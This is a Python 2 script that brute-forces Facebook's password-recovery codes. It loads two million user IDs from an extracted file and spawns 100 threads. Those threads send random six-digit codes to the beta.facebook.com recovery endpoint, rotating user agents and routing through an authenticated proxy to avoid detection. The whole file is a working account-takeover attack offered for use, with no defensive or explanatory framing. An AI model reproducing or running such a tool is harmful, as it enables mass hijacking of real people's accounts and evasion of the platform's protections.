from bs4 import BeautifulSoup
from Queue import Queue
from fake_useragent import UserAgent
from cred import USER, PASS, PROX_URL, PORT
import urllib2, sys, threading, random

START_QUEUE = 0
END_QUEUE = 2000000
num_threads = 100

base_url = "https://www.beta.facebook.com/recover/password?u="
queue = Queue(maxsize=0)
useragent = UserAgent()
ids = []

class ThreadWorker(threading.Thread):
	def __init__(self, queue):
		threading.Thread.__init__(self)
		self.queue = queue

	def run(self):
		while self.queue.qsize() != 0:
			curr_item = self.queue.get(timeout=10)
			self.fetch_url(curr_item[0],curr_item[1], curr_item[2])
			self.queue.task_done()

	def fetch_url(self,user_id, curr_n, curr_num):

		url = base_url + str(user_id) + "&n=" + "{0:06}".format(curr_n)
		try:
			request = urllib2.Request(url, None,{"User-agent":useragent.random})
			response = urllib2.urlopen(request)
			soup = BeautifulSoup(response.read(), "html.parser")
			print user_id, curr_num, soup.h2.string
				
		except urllib2.URLError, e:
			if hasattr(e, "code"):
				print e.code, user_id, e.reason
		except KeyboardInterrupt:
			print "KeyboardInterrupt"
			sys.exit()
		except Exception, e:
			print "EXCEPTION:", str(e), user_id
			sys.exit()

def spawn():
	for x in xrange(num_threads):
		thread = ThreadWorker(queue)
		thread.daemon = True
		thread.start()

def add_to_queue():
	global queue
	for x in xrange(START_QUEUE, END_QUEUE, 1):
		user_id = ids[x]
		for r in xrange(25):
			random_int = random.randint(100000,999999)
			queue.put((user_id,random_int,r+1))

def fetch_ids():
	global ids
	with open("./Extracts/2mil_ids.json","r") as json_file:
		id_dict = json.load(json_file)	
	ids = id_dict.keys()

def setup_proxy():
	proxy = urllib2.ProxyHandler({"http": "http://"+USER+":"+PASS+"@"+PROX_URL+":"+PORT})
	auth = urllib2.HTTPBasicAuthHandler()
	opener = urllib2.build_opener(proxy,auth,urllib2.HTTPHandler)
	urllib2.install_opener(opener)

if __name__ == '__main__':
	setup_proxy()
	fetch_ids()
	add_to_queue()
	spawn()
	queue.join()